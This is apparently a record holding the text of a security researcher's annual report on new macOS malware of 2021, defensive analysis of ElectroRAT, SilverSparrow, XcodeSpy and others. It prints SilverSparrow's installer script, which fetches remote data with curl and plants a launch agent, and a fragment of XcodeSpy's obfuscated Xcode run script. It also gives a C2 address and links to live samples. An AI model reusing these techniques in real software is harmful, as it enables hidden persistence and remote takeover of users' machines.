{
    "id": "6ed8f84c-fcb2-46b9-9b5a-aca7787ee43b",
    "created_at": "2022-10-25T16:48:17.24244Z",
    "updated_at": "2025-03-27T02:14:39.120813Z",
    "deleted_at": null,
    "sha1_hash": "6ed98087e8d743c12252928698ca026b13ee0660",
    "title": "The Mac Malware of 2021",
    "authors": "",
    "file_creation_date": "2022-01-08T00:56:20Z",
    "file_modification_date": "2022-01-08T00:56:20Z",
    "file_size": 7398176,
    "plain_text": "#### p g\n\n\n# The Mac Malware of 2021\n##### a comprehensive analysis of the year's new malware!\n\nby: Patrick Wardle / January 1, 2022\n\n\nObjective-See's research, tools, and writing, are supported by the \"Friends of Objective-See\" such as:\n\n\n1Password\n\n\nJamf\n\n\nMosyle\n\n\nKandji\n\n\nCleanMyMac X\n\n\nKolide\n\n\n### Printable\n\nA printable (PDF) version of this report can be downloaded here:\n\n**[The Mac Malware of 2021.pdf](https://objective-see.com/downloads/MacMalware_2021.pdf)**\n\n### Background\n\nGoodbye, and good riddance 2021 …and hello 2022!\n\nFor the sixth year in a row, I’ve put together a blog post that comprehensively covers all the new Mac malware that appeared during the\ncourse of the year.\n\nWhile the specimens may have been reported on before (i.e. by the AV company that discovered them), this blog aims to cumulatively and\ncomprehensively cover all the new Mac malware of 2021 - in one place …yes, with samples of each malware available for download!\n\nAfter reading this blog post, you should have a thorough understanding of recent threats targeting macOS. This is especially important as\nApple continues to make **[significant inroads into the enterprise:](https://www.computerworld.com/article/3636409/apple-gains-traction-as-enterprise-workplaces-become-hybrid.html)**\n\n\n-----\n\n…and unsurprisingly macOS malware continues following suit!\n```\n In this blog post, we focus on new Mac malware specimens or significant new variants that appeared in\n 2021. Adware and/or malware from previous years, are not covered.\n However at the end of this blog, I’ve included a section dedicated to these other threats, that\n includes a brief overview, and links to detailed write-ups.\n\n```\nFor each malicious specimen covered in this post, we’ll identify the malware’s:\n\n**Infection Vector:**\nHow it was able to infect macOS systems.\n\n**Persistence Mechanism:**\nHow it installed itself, to ensure it would be automatically restarted on reboot/user login.\n\n**Features & Goals:**\nWhat was the purpose of the malware? a backdoor? a cryptocurrency miner? or something more insidious…\n\nAlso, for each malware specimen, I’ve added a direct download link to the malware specimen, case you want to follow along with my\nanalysis or dig into the malware more!\n\n### Malware Analysis Tools & Tactics\n\nThroughout this blog, I reference various tools used in analyzing the malware specimens. While there are a myriad of malware analysis tools,\nthese are some of my favorites, and include:\n```\n  ProcessMonitor\n\n```\nMy open-source utility that monitors process creations and terminations, providing detailed information about such events.\n```\n  FileMonitor\n\n```\nMy open-source utility that monitors file events (such as creation, modifications, and deletions) providing detailed information about\nsuch events.\n```\n  WhatsYourSign\n\n```\nMy open-source utility that displays code-signing information, via the UI.\n```\n  Netiquette\n\n```\nMy open-source light weight network monitor.\n```\n  lldb\n\n```\nThe de-facto commandline debugger for macOS. Installed (to /usr/bin/lldb) as part of Xcode.\n```\n  Hopper Disassembler\n\n```\nA “reverse engineering tool (for macOS) that lets you disassemble, decompile and debug your applications” …or malware specimens!\n\n```\n Interested in general Mac malware analysis techniques?\n           You're in luck, as I've written an entire (free) book on this\n           very topic:\n                 The Art Of Mac Malware, Vol. 0x1: Analysis\n\n```\n\n-----\n\nBelow, is a timeline highlighting the new macOS malware of 2021:\n\n\n-----\n\ng\n\n```\n OSX.ElectroRAT\n ElectroRAT is a cross-platform remote “administration” tool (RAT), designed to steal information from\n cryptocurrency users.\n  Download: OSX.ElectroRAT (password: infect3d)\n\n###### ElectroRAT was uncovered by Intezer, who note:\n\n```\n_\"we discovered a wide-ranging operation targeting cryptocurrency users, estimated to have initiated in January 2020. This_\n_extensive operation is composed of a full-fledged marketing campaign, custom cryptocurrency-related applications and a_\n_new Remote Access Tool (RAT) written from scratch.\"_\n\n_[its main goal appears to] ...steal personal information from cryptocurrency users\" -Intezer_\n\n**Writeups:**\n\n**[“Discharging ElectroRAT”](https://objective-see.com/blog/blog_0x61.html)**\n\n**[“Operation ElectroRAT: Attacker Creates Fake Companies to Drain Your Crypto Wallets”](https://www.intezer.com/blog/research/operation-electrorat-attacker-creates-fake-companies-to-drain-your-crypto-wallets/)**\n\n**Infection Vector: Trojanized/Fake Crypto-Currency Applications**\n\nIn terms of its infection vector, Intezer noted the use of trojanized/fake crypto currency applications :\n\n_\"These [malicious] applications were promoted in cryptocurrency and blockchain-related forums such as bitcointalk and_\n_SteemCoinPan. The promotional posts, published by fake users, tempted readers to browse the applications’ web pages,_\n_where they could download the application without knowing they were actually installing malware.\" -Intezer_\n\n\n-----\n\neTrader app, containing ElectroRAT\n\n\n-----\n\neTrader app, containing ElectroRAT\n\nIf the user is tricked into downloading and running the application, they will inadvertently infect themselves with ElectroRAT.\n\nThe malware is found within the trojanized application bundle, as a binary named mdworker\n\n\n-----\n\neTrader app, containing ElectroRAT\n\nVia a **[ProcessMonitor, we see that the trojanized application (whose pid is 1350) will execute this mdworker binary (via bash):](https://objective-see.com/products/utilities.html#ProcessMonitor)**\n\n\n###### # ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty\n\n {  \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",  \"process\" : {   ...   \"uid\" : 501,   \"arguments\" : [    \"/bin/sh\",    \"-c\",    \"/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker\"   ],   \"ppid\" : 1350,\n   \"architecture\" : \"Intel\",   \"path\" : \"/bin/sh\",\n   \"name\" : \"sh\",   \"pid\" : 1355  } }\n\n\n**Persistence: Launch Item**\n```\nOSX.ElectroRAT persists as a launch agent (mdworker.plist).\n\n```\n\n-----\n\n###### # FileMonitor.app/Contents/MacOS/FileMonitor -pretty {  \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",  \"file\" : {   \"destination\" : \"/Users/user/Library/LaunchAgents/mdworker.plist\",   \"process\" : {\n    \"uid\" : 501,    \"arguments\" : [     \"/bin/sh\",     \"-c\",     \"/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker\"    ],    \"ppid\" : 1350,\n    \"architecture\" : \"Intel\",    \"path\" : \"/Users/user/Desktop/eTrader.app/Contents/Utils/mdworker\",    \"name\" : \"mdworker\",    \"pid\" : 1351   }  } }\n\n\nThe launch agent plist (mdworker.plist) references a .mdworker binary, which is a copy of the Utils/mdworker binary (aka the\nmalware):\n\n\n###### % cat ~/Library/LaunchAgents/mdworker.plist <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\">  <dict>   <key>Label</key>   <string>mdworker</string>   <key>ProgramArguments</key>    <array>     <string>/Users/user/.mdworker</string>    </array>   <key>RunAtLoad</key>   <true/>  </dict> </plist>\n\n\nAs the RunAtLoad is set to true the OS will automatically (re)launch the malware each time the user (re)logs in.\n\n**Capabilities: Persistent Backdoor (+ embedded binaries).**\n\n[In a Twitter thread, Avigayil (the security researcher at Intezer) notes that the malware first “queries a raw pastebin page to retrieve the C&C](https://twitter.com/AbbyMCH)\n_IP address\":_\n\n\n-----\n\n[[1/7] Operation #ElectroRAT is a new campaign that takes sizable](https://twitter.com/hashtag/ElectroRAT?src=hashtag_click)\nmeasures to steal crypto wallets. For more information about the\n[operation - intezer.com/blog/research/…](https://t.co/CWLnOevKir?amp=1)\n\nThe following is a technical analysis->\n[@IntezerLabs](https://twitter.com/IntezerLabs?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1346470186082136064%7Ctwgr%5E%7Ctwcon%5Es2_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\nElectroRAT: Attacker Creates Fake Companies to Drain Crypto…\nWide-spread campaign already with thousands of victims\npromotes trojanized applications on niche cryptocurrency …\n\nintezer.com\n\nAvigayil Mechtinger\n@AbbyMCH\n\n#### [2/7] Upon execution, ElectroRAT queries a raw pastebin page to retrieve the C&C IP address. The malware then calls the registerUser function, which creates and sends a user registration Post request to the C&C.\n\n[4:54 AM · Jan 5, 2021](https://twitter.com/AbbyMCH/status/1346470186082136064?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1346470186082136064%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n4 [Reply](https://twitter.com/intent/tweet?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1346470186082136064%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html&in_reply_to=1346470186082136064) Share this Tweet\n\n[Read 2 replies](https://twitter.com/AbbyMCH/status/1346470186082136064?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1346470186082136064%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n\nVia Wireshark, we can confirm the macOS variant of ElectroRAT performs these same actions. First querying pastebin:\n\n\n-----\n\n…and then once the address of the command and control server (213.226.100.140) is retrieved, connects out (with some basic\ninformation about infected machine):\n\nOnce the malware has checked in with the command and control server, it acts upon any (remote) tasking:\n\n\n-----\n\nReplying to @AbbyMCH\n\n[4/7] The malware sends a GET request to the C&C with the\nvictim’s machine ID as a parameter. ElectroRAT, then changes the\ncommunication protocol between the C&C and RAT to WebSocket.\nNext, the malware keeps alive WebSocket communication and waits\nfor a command from the C&C.\n\nAvigayil Mechtinger\n@AbbyMCH\n\n#### [5/7] Commands received from the C&C are parsed by the RAT using corresponding functions before sending a message back with the response. The commands are sent as a json structure with the following keys: type, uid and data for additional parameters needed for the command.\n\n[4:54 AM · Jan 5, 2021](https://twitter.com/AbbyMCH/status/1346470201173266432?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1346470201173266432%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n4 [Reply](https://twitter.com/intent/tweet?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1346470201173266432%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html&in_reply_to=1346470201173266432) Share this Tweet\n\n[Read 1 reply](https://twitter.com/AbbyMCH/status/1346470201173266432?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1346470201173266432%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n\n[4:54 AM · Jan 5, 2021](https://twitter.com/AbbyMCH/status/1346470201173266432?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1346470201173266432%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n\n**[Avigayil also notes that:](https://twitter.com/AbbyMCH)**\n\n_\"The attacker uses go-bindata to embed additional binaries within the malware\"_\n\n[In my write-up on the macOS variant of ElectroRAT, I describe how to extract these embedded binaries.](https://objective-see.com/blog/blog_0x61.html)\n\nThese binaries include:\n```\n  darwinCam (SHA1: 7e0a289572c2b3ef5482dded6019f51f35f85456):\n\n```\n\n-----\n\n###### ./darwinCam -h\n\n USAGE: ./darwinCam [options] [filename] Version: 0.2.5 Captures an image from a video device and saves it in a file. If no device is specified, the system default will be used. If no filename is specfied, snapshot.jpg will be used. Supported image types: JPEG, TIFF, PNG, GIF, BMP  -h     This help message  -v     Verbose mode  -l     List available video devices  -t x.xx   Take a picture every x.xx seconds  -q     Quiet mode. Do not output any text  -w x.xx   Warmup. Delay snapshot x.xx seconds after turning on camera  -d device  Use named video device\n\n```\ndarwinChrome (SHA1: 4bb418ba9833cd416fd02990b8c8fd4fa8c11c0c):\n\n```\nVia embedded strings, we can determine that the darwinChrome was packaged up with PyInstaller. As such can use the\n**[pyinstxtractor utility, to extract (unpackage) its contents:](https://github.com/extremecoders-re/pyinstxtractor)**\n\n\n###### $ python pyinstxtractor.py darwinChrome\n [+] Processing darwinChrome\n [+] Pyinstaller version: 2.1+\n [+] Python version: 27\n [+] Length of package: 5155779 bytes\n [+] Found 109 files in CArchive\n [+] Beginning extraction...please standby\n [+] Possible entry point: pyiboot01_bootstrap.pyc\n [+] Possible entry point: Apple.pyc\n [+] Found 335 files in PYZ archive\n [+] Successfully extracted pyinstaller archive: darwinChrome\n\n\nThis produces several files including a compiled Python file, Apple.pyc. Via an online decompiler we can then recover\n```\nApple.pyc’s Python source code, and reveal that is is a Chrome password stealer.\ndarwinKeylogger (SHA1: 3bcbfc40371c8d96f94b5a5d7c83264d22b0f57b):\n\n```\nThis binary appears to be a basic macOS keylogger based on the open-source **[Swift-Keylogger project (that (ab)uses](https://github.com/SkrewEverything/Swift-Keylogger/blob/master/Keylogger/Keylogger/Keylogger.swift)**\n```\nIOHIDManagerCreate / IOHIDManagerRegisterInputValueCallback).\ndarwinVnc (SHA1: 872da05c137e69617e16992146ebc08da3a9f58f):\n\n```\n[This binary appears to the well known OSXvnc, a “robust, full-featured VNC server for MacOS X\":](https://github.com/stweil/OSXvnc)\n\n\n###### ./darwinVnc -h\n\n Available options:\n\n -rfbport port     TCP port for RFB protocol -rfbwait time     Maximum time in ms to wait for RFB client -rfbnoauth       Run the server without password protection -rfbauth passwordFile Use this password file for VNC authentication            (use 'storepasswd' to create a password file)\n\n\n-----\n\n```\nElectroRAT also supports a variety of built-in standard backdoor capabilities …such command execution, file upload/download and\n\n```\nmore. We can see the functions that implement this logic within the malware’s binary, by searching for “main.\":\n\nbuilt-in capabilities\n\n**[Avigayil sums this up well:](https://twitter.com/AbbyMCH)**\n\n_\"ElectroRAT is extremely intrusive._\n\n_...it has various capabilities such as keylogging, downloading files and executing commands on the victim's console.\"_\n\n\n-----\n\n```\nCompiled to natively execute on Apple Silicon (M1/arm64), this payload-less malware, affected\napproximately 30,000 Macs.\n  Download: OSX.SilverSparrow (password: infect3d)\n\n```\n```\nSilverSparrow was discovered by researchers at Red Canary, in mid-February:\n\n```\nRed Canary\n@redcanary\n\n#### Silver Sparrow is a cluster of activity that includes a binary compiled to run on Apple’s new M1 chips but lacks one very important feature: a malicious payload. redcanary.com/blog/clipping-…\n\nSilver Sparrow macOS malware with M1 compatibility\nSilver Sparrow includes a binary compiled to run on Apple’s new\nM1 chips but lacks one very important feature: a payload\n\nredcanary.com\n\n[2:21 PM · Feb 18, 2021](https://twitter.com/redcanary/status/1362557900128985089?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1362557900128985089%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n[Read the full conversation on Twitter](https://twitter.com/redcanary/status/1362557900128985089?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1362557900128985089%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n285 [Reply](https://twitter.com/intent/tweet?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1362557900128985089%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html&in_reply_to=1362557900128985089) Share this Tweet\n\n[Read 8 replies](https://twitter.com/redcanary/status/1362557900128985089?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1362557900128985089%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\nThey shared their findings in a detailed **[write-up …have a read!](https://redcanary.com/blog/clipping-silver-sparrows-wings/)**\n\n**Writeups:**\n\n**[“Clipping Silver Sparrow’s wings”](https://redcanary.com/blog/clipping-silver-sparrows-wings/)**\n\n**[“The mystery of the Silver Sparrow Mac malware”](https://blog.malwarebytes.com/mac/2021/02/the-mystery-of-the-silver-sparrow-mac-malware/)**\n\n**Infection Vector: Installer Packages, via ...?**\n\n\n-----\n\n[The noted mac malware analyst Thomas Reed, articulates this well:](https://twitter.com/thomasareed)\n\n_\"We know that the malware was installed via Apple installer packages (.pkg files) named update.pkg or updater.pkg._\n_However, we do not know how these files were delivered to the user\"_\n\nInterestingly, as noted the Red Canary researchers, these .pkg files leverage “the macOS Installer JavaScript API to execute suspicious\ncommands”\n\nSilverSparrows Packages / Logic (credit: Red Canary)\n\nWe can expand the .pkg file, then view this JavaScript (found in the .pkgs Distribution XML):\n\n\n###### % pkgutil --expand-full SilverSparrow/updater.pkg SilverSparrow/expandedPKG\n\n % cat SilverSparrow/expandedPKG/Distribution <?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?> <installer-gui-script minSpecVersion=\"1\">   <pkg-ref id=\"updater.pkg\">     <bundle-version>       <bundle CFBundleShortVersionString=\"1.0\" CFBundleVersion=\"1\"        id=\"com.tasks.updater\" path=\"updater.app\"/>     </bundle-version>   </pkg-ref>   <!-- <welcome file=\"readme.html\"/> -->   ...   <installation-check script=\"installation_check()\"/>   <script><![CDATA[\n\n\n-----\n\n######     system.run( /bin/bash, -c, command)   }\n\n   function writeToFile(line, file)   {     bash(`printf \"%b\\n\" '${line}' >> ${file}`)   }\n\n   ...\n\n   bash(`mkdir ${updaterDir}`)   bash(`/usr/bin/curl ${url} > /tmp/version.json`)   bash(`touch /tmp/version.plist`)   bash(`touch ${updaterMonitorPath}`)   bash(`plutil -convert xml1 -r /tmp/version.json -o /tmp/version.plist`)\n\n   var data = system.files.plistAtPath(\"/tmp/version.plist\")   var args = data.args.split(\" \")\n\n\nWhen executed, the malicious JavaScript code (shown above) would run, and persistently install the malware.\n\n**Persistence: Launch Agent**\n```\nSilverSparrow will persist as a Launch Agent (named for example init_agent.plist).\n\n```\nThe code that persists the malware can be found in the package’s Distribution file, specifically in a function, aptly named, createAgent\n(that leverages macOS’s PlistBuddy utility):\n\n\n###### % cat SilverSparrow/expandedPKG/Distribution\n\n function createAgent() { bash(`/usr/libexec/PlistBuddy -c     \"Add :Label string ${initAgentLabel}\" ${initAgentPath};`)\n\n bash(`/usr/libexec/PlistBuddy -c     \"Add :RunAtLoad bool true\" ${initAgentPath};`)\n\n bash(`/usr/libexec/PlistBuddy -c     \"Add :StartInterval integer 3600\" ${initAgentPath};`)\n\n bash(`/usr/libexec/PlistBuddy -c    \"Add :ProgramArguments array\" ${initAgentPath};`)\n\n bash(`/usr/libexec/PlistBuddy -c     \"Add :ProgramArguments:0 string '/bin/sh'\" ${initAgentPath};`)\n bash(`/usr/libexec/PlistBuddy -c     \"Add :ProgramArguments:1 string -c\" ${initAgentPath};`)\n\n bash(`/usr/libexec/PlistBuddy -c    'Add :ProgramArguments:2 string     \\\"~/Library/Application\\\\\\\\ Support/${agentLabel}_updater/${agentLabel}.sh\\\"     ${ts} ${data.dls} 1' ${initAgentPath};`)\n\n\n-----\n\nOnce the Launch Agent has been installed, every hour (due to the StartInterval:3600), the item specified in the Launch Agent plist\nwill be executed.\n\nThe Red Canary researchers note this persisted item is a shell script that, “downloads a JSON file to disk, converts it into a plist, and uses\n_its properties to determine further actions.”_\n\n**Capabilities: Unknown**\n\nThough SilverSparrow was found affecting roughly 30,000 macOS systems, no second payload was uncovered:\n\n_\"...After observing the malware for over a week, neither we nor our research partners observed a final payload, leaving the_\n_ultimate goal of Silver Sparrow activity a mystery\" -Red Canary_\n\nHowever, one reasonable guess is the malware would simply download and install adware, based on values seen a downloaded\n```\nversions.json file:\n\n```\n_\"The args value in the data from the command and control server (upbuchupsf) looks similar to an affiliate code, often used_\n_by adware.\" -Thomas Reed_\n\n…of course, it’s worth pointing out that the payload could be anything!\n```\n OSX.XcodeSpy\n Spreading via malicious Xcode projects, this malware installs a custom variant of the EggShell\n backdoor.\n  Download: OSX.XcodeSpy (password: infect3d)\n\n```\nIn March, SentinelOne security researcher **[Phil Stokes published a write-up on XcodeSpy, and noted its (ab)use of Xcode projects as a](https://twitter.com/philofishal)**\nmeans to target and surreptitiously infect developers.\n\n**Writeups:**\n\n**[XcodeSpy Malware](https://www.patreon.com/posts/48935186/)**\n\n**[“New macOS Malware XcodeSpy Targets Xcode Developers with EggShell Backdoor”](https://www.sentinelone.com/labs/new-macos-malware-xcodespy-targets-xcode-developers-with-eggshell-backdoor/)**\n\n**Infection Vector: Subverted Xcode Projects**\n\nArguable the most interesting aspect of XcodeSpy is its infection vector: subverted Xcode Projects.\n\nThe XcodeSpy stealthily modified a copies of various open-source Xcode projects, by inserting a malicious (and obfuscated) Run Script:\n\n\n###### $ cat project.pbxproj /* Begin PBXShellScriptBuildPhase section */   25CC3805250133BA0078D705 /* ShellScript */ = {    isa = PBXShellScriptBuildPhase;    ...    shellPath = /bin/sh;\n\n\n-----\n\n######     ;pm= &1 ;zf= .ta ;ip= w.c ;gd= tcp ;cy= &> ;to= > / ;vab= vat ;si= md     ';jv='ral';am='g;b';pjb='o m';n='443';     eval \\\"$odb$pjb$rc$si$to$uu$vab$wgb$xmb$zf$am$bs...$n$og$pm$qs\\\"\\n\";   };\n\n\n…if the project is downloaded and built by an unsuspecting developer, the script will be run, and the malware installed!\n\n**Persistence: Launch Item**\n\nIn terms of persistence, Phil notes:\n\n_\"The [Xcode run] script contacts the attackers' C2 and drops a custom variant of the EggShell backdoor on the_\n_development machine. The malware installs a user LaunchAgent for persistence.\"_\n\nThe Launch Agent (com.apple.appstore.checkupdate.plist or com.apple.usagestatistics.plist) will ensure the\nmalware, EggShell is automatically (re)executed whenever the user logs in.\n\n**Capabilities: Backdoor**\n\nXcodeSpy installs the well known, open-source Eggshell backdoor. From its README.md file:\n\n_\"EggShell is a post exploitation surveillance tool written in Python. It gives you a command line session with extra_\n_functionality between you and a target machine. EggShell gives you the power and convenience of uploading/downloading_\n_files, tab completion, taking pictures, location tracking, shell command execution, persistence, escalating privileges,_\n_password retrieval, and much more.\"_\n\n…with this fully-featured backdoor installed, clearly an infected Mac is almost completely under the control of a remote attacker.\n\nIn this writeup, Phil notes that the EggShell variant used by XcodeSpy is fairly standard, though it does deviate slightly, by using its\n“own custom data encoding and keylogging methods.”\n\n\n-----\n\nEggShell keylogger detected (via ReiKey)\n```\n OSX.ElectrumStealer\n Inadvertently notarized by Apple, ElectrumStealer targeted cryptocurrency users via a backdoored\n Electrum wallet.\n  Download: OSX.ElectrumStealer (password: infect3d)\n\n```\n[In March, security researcher Taha T of Confiant uncovered malicious application, (inadvertently) notarized by Apple:](https://twitter.com/lordx64)\n\nConfiantIntel\n@ConfiantIntel\n\n#### @lordx64 found yet another @Apple notarized App, this time it is a backdoored Electrum Wallet (thread) \n\n Signed with :\n\n Authority=Developer ID Application: Viktoriia Abaeva (QVU8CNY775)\n\n[5:02 AM · Mar 4, 2021](https://twitter.com/ConfiantIntel/status/1367490751957975058?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1367490751957975058%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n[Read the full conversation on Twitter](https://twitter.com/ConfiantIntel/status/1367490751957975058?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1367490751957975058%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n88 [Reply](https://twitter.com/intent/tweet?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1367490751957975058%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html&in_reply_to=1367490751957975058) Share this Tweet\n\n[Read 3 replies](https://twitter.com/ConfiantIntel/status/1367490751957975058?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1367490751957975058%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\nMalwareBytes, noted,\n\n_\"OSX.ElectrumStealer is a trojanized Electrum Wallet that tries to steal cryptocurrencies from the infected systems.\"_\n\n_-MalwareBytes_\n\n\n-----\n\n**[“OSX.ElectrumStealer”](https://blog.malwarebytes.com/detections/osx-electrumstealer/)**\n\n**[“How to extract Python source code from Py2App packed Mach-O Binaries (ElectrumStealer)\"](https://lordx64.medium.com/how-to-extract-python-source-code-from-py2app-packed-mach-o-binaries-4da244e54c88/)**\n\n**Infection Vector: Malicious Ads / Fake Update Prompt**\n\nIn a tweet, Confiant noted the malware’s initial infection vector: malicious ads:\n\n[ConfiantIntel @ConfiantIntel](https://twitter.com/ConfiantIntel?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1367490781439807490%7Ctwgr%5E%7Ctwcon%5Es2_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html) [· Mar 4, 2021](https://twitter.com/ConfiantIntel/status/1367490778503733262?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1367490781439807490%7Ctwgr%5E%7Ctwcon%5Es2_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\nReplying to @ConfiantIntel\n\nelectrum/storage.py calls the backdoor code, prefix_log function is\ncalled at the beginning of WalletStorage constructor (to Exfil the\nwallet) and then in every function involving wallet passwords:\ndecrypt(), encrypt_before_writing(), set_password() to exfiltrate\nthe password\n\nConfiantIntel\n@ConfiantIntel\n\n#### These fake wallets were introduced during a Malvertising attack our security team discovered early this week, involving the hacking of a Major SSP. The hackers redirected the victims to https://electrum-4.github[.]io/ asking them to install an update of the electrum wallet.\n\n[5:03 AM · Mar 4, 2021](https://twitter.com/ConfiantIntel/status/1367490781439807490?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1367490781439807490%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n12 [Reply](https://twitter.com/intent/tweet?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1367490781439807490%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html&in_reply_to=1367490781439807490) Share this Tweet\n\n[Read 2 replies](https://twitter.com/ConfiantIntel/status/1367490781439807490?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1367490781439807490%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n_\"These fake wallets were introduced during a Malvertising attack our security team discovered early this week, involving the_\n_hacking of a Major SSP. The hackers redirected the victims to https://electrum-4.github[.]io/ asking them to install an update_\n_of the electrum wallet.\" -Confiant_\n\nIn their brief **[write-up on ElectrumStealer Malwarebytes describes another apparent infection vector:](https://blog.malwarebytes.com/detections/osx-electrumstealer/)**\n\n_\"OSX.ElectrumStealer is spread sending an error message in the form of a prompt for a 'required update' to the nodes_\n_connected to the threat actors server(s) on the Electrum network.\" -Malwarebytes_\n\n\n-----\n\nOSX.ElectrumSteal fake update prompt (credit: Malwarebytes)\n\n**Persistence: None(?)**\n\n[In Taha’s writeup on extracting ElectrumStealer’s payload(s), there is no discussion of persistence.](https://lordx64.medium.com/how-to-extract-python-source-code-from-py2app-packed-mach-o-binaries-4da244e54c88)\n\nThis is perhaps unsurprising as the malware’s goal is exfiltrate (crypto-currency) wallets and wallets' passwords. As this code is triggered\neach time the trojanized wallet application is launched by the user, persistence is perhaps not-needed!\n\n**Capabilities: Crypto-currency wallet theft**\n\nThe goal of ElectrumStealer is simply to steal infected user’s crypto-currency wallets and wallet passwords. In a series of tweets\nConfiant described exactly how this is achieved.\n\nFirst, they note that the core of the malicious code is a function innocuously named prefix_log. This function will exfiltrate passed in\ndata to the remote attackers.\n\nConfiant then goes on to show that this exfiltration function is invoked at various places within the trojanized wallet application. For\nexample, in the WalletStorage constructor to exfiltrate the wallet:\n\n\n-----\n\nA call to prefix_log() will exfiltrate the wallet (credit: Confiant)\n\nThe prefix_log exfiltration function is also inserted at locations in the trojanized wallet application, such that wallet passwords can be\nexfiltrated as well (for example in the decrypt function):\n\n\n-----\n\nOther calls to prefix_log() will exfiltrate the wallet password (credit: Confiant)\n\n…end result, the user’s wallet and password will now belong to the attacker!\n```\n WildPressure (macOS variant)\n WildPressure is a cross-platform Python backdoor, targeting mainly users in the Middle East.\n  Download: OSX.WildPressure (password: infect3d)\n\n```\n[The malware was discovered by Kasperksy researchers, in early July. In a write-up titled, “WildPressure targets the macOS platform,” the](https://securelist.com/wildpressure-targets-macos/103072/)\nresearchers noted:\n\n_\"...the most interesting finding here is that this malware was developed for both Windows and macOS operating systems\" -_\n_Kaspersky_\n\n```\n1 class OSType:\n2   Windows = \"Windows\"\n3   OSX = \"Darwin\"\n4   Linux = \"Linux\"\n\n```\n\n**Writeups:**\n\n**[“New Mac Malware: OSX.WildPressure”](https://www.patreon.com/posts/53462690)**\n\n**[“WildPressure targets the macOS platform”](https://securelist.com/wildpressure-targets-macos/103072/)**\n\n**Infection Vector: Unknown**\n\n\n-----\n\n_y_ _y_ _p_ 